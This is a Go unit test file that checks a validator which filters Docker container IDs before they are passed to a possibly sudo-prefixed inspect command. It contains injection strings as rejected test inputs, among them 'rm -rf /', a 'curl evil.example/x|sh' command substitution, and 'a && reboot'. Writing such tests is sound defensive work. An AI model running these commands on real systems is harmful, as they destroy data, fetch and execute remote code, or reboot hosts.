package discovery

import (
	"strings"
	"testing"
)

func TestFilterIDs(t *testing.T) {
	tests := []struct {
		name         string
		in           []string
		wantSafe     []string
		wantRejected []string
	}{
		{
			name:     "short and full docker ids",
			in:       []string{"f0f94d87d8d5", strings.Repeat("a", 64)},
			wantSafe: []string{"f0f94d87d8d5", strings.Repeat("a", 64)},
		},
		{
			name:         "shell metacharacters",
			in:           []string{"abc123; rm -rf /"},
			wantRejected: []string{"abc123; rm -rf /"},
		},
		{
			name:         "command substitution",
			in:           []string{"$(curl evil.example/x|sh)"},
			wantRejected: []string{"$(curl evil.example/x|sh)"},
		},
		{
			name:         "uppercase is not a docker id",
			in:           []string{"F0F94D87D8D5"},
			wantRejected: []string{"F0F94D87D8D5"},
		},
		{
			name:         "too short, and over 64",
			in:           []string{"abc", strings.Repeat("a", 65)},
			wantRejected: []string{"abc", strings.Repeat("a", 65)},
		},
		{
			name:         "one bad id does not drop the good ones",
			in:           []string{"f0f94d87d8d5", "x y", "32636157a9d5"},
			wantSafe:     []string{"f0f94d87d8d5", "32636157a9d5"},
			wantRejected: []string{"x y"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			safe, rejected := filterIDs(tt.in)
			if !equalStrings(safe, tt.wantSafe) {
				t.Errorf("safe = %q, want %q", safe, tt.wantSafe)
			}
			if !equalStrings(rejected, tt.wantRejected) {
				t.Errorf("rejected = %q, want %q", rejected, tt.wantRejected)
			}
		})
	}
}

// TestFilterIDsKeepsInjectionOffTheCommandLine is the property that matters: the
// inspect command may be prefixed with sudo, so nothing a remote can shape may
// reach it unvalidated.
func TestFilterIDsKeepsInjectionOffTheCommandLine(t *testing.T) {
	safe, _ := filterIDs([]string{"f0f94d87d8d5", "`id`", "a && reboot"})
	cmd := DefaultInspectCommand + " " + strings.Join(safe, " ")
	for _, bad := range []string{"`", "&", "|", ";", "$", " id", "reboot"} {
		if strings.Contains(strings.TrimPrefix(cmd, DefaultInspectCommand), bad) {
			t.Errorf("command %q still carries %q", cmd, bad)
		}
	}
}

func equalStrings(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
